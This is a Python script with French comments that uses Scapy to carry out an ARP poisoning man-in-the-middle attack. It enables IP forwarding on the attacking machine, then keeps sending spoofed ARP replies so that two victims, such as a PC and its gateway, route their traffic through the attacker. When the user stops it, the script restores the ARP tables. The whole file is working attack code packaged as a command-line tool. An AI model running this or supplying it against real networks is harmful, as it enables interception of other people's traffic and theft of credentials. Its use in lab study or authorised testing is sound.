from scapy.all import ARP, send, sniff
import argparse
import os

def enable_ip_forwarding():
    """
    Active le forwarding IP sur la machine attaquante pour permettre
    le transfert des paquets entre les deux victimes.
    """
    print("[INFO] Activation du forwarding IP...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def arp_poison(victim_ip1, victim_ip2, victim_mac1, victim_mac2, interface):
    """
    Maintient une attaque ARP poisoning entre deux victimes.
    - victim_ip1 : Adresse IP de la première victime (ex : PC1)
    - victim_ip2 : Adresse IP de la seconde victime (ex : passerelle)
    - victim_mac1 : Adresse MAC associée à victim_ip1
    - victim_mac2 : Adresse MAC associée à victim_ip2
    - interface : Interface réseau utilisée
    """
    print(f"[INFO] Lancement de l'attaque ARP poisoning entre {victim_ip1} et {victim_ip2}...")

    # Construction des paquets ARP pour les deux victimes
    poison_victim1 = ARP(op=2, pdst=victim_ip1, hwdst=victim_mac1, psrc=victim_ip2)
    poison_victim2 = ARP(op=2, pdst=victim_ip2, hwdst=victim_mac2, psrc=victim_ip1)

    try:
        while True:
            # Envoi des paquets ARP pour maintenir l'attaque
            send(poison_victim1, iface=interface, verbose=0)
            send(poison_victim2, iface=interface, verbose=0)
            print(f"[ARP] {victim_ip1} pense que {victim_ip2} -> MAC attaquant")
            print(f"[ARP] {victim_ip2} pense que {victim_ip1} -> MAC attaquant")
    except KeyboardInterrupt:
        print("\n[INFO] Arrêt de l'attaque. Restauration des tables ARP...")
        restore_arp(victim_ip1, victim_mac1, victim_ip2, victim_mac2, interface)

def restore_arp(victim_ip1, victim_mac1, victim_ip2, victim_mac2, interface):
    """
    Restaure les tables ARP des deux victimes pour rétablir les associations correctes.
    """
    restore_victim1 = ARP(op=2, pdst=victim_ip1, hwdst=victim_mac1, psrc=victim_ip2, hwsrc=victim_mac2)
    restore_victim2 = ARP(op=2, pdst=victim_ip2, hwdst=victim_mac2, psrc=victim_ip1, hwsrc=victim_mac1)

    send(restore_victim1, iface=interface, count=5, verbose=0)
    send(restore_victim2, iface=interface, count=5, verbose=0)
    print("[INFO] Tables ARP restaurées.")

def main():
    parser = argparse.ArgumentParser(description="Script ARP Man-in-the-Middle (MITM) avec Scapy.")
    parser.add_argument("victim_ip1", help="Adresse IP de la première victime (ex : PC1).")
    parser.add_argument("victim_ip2", help="Adresse IP de la seconde victime (ex : passerelle).")
    parser.add_argument("victim_mac1", help="Adresse MAC de la première victime.")
    parser.add_argument("victim_mac2", help="Adresse MAC de la seconde victime.")
    parser.add_argument("interface", help="Interface réseau à utiliser.")
    args = parser.parse_args()

    enable_ip_forwarding()
    arp_poison(args.victim_ip1, args.victim_ip2, args.victim_mac1, args.victim_mac2, args.interface)

if __name__ == "__main__":
    main()
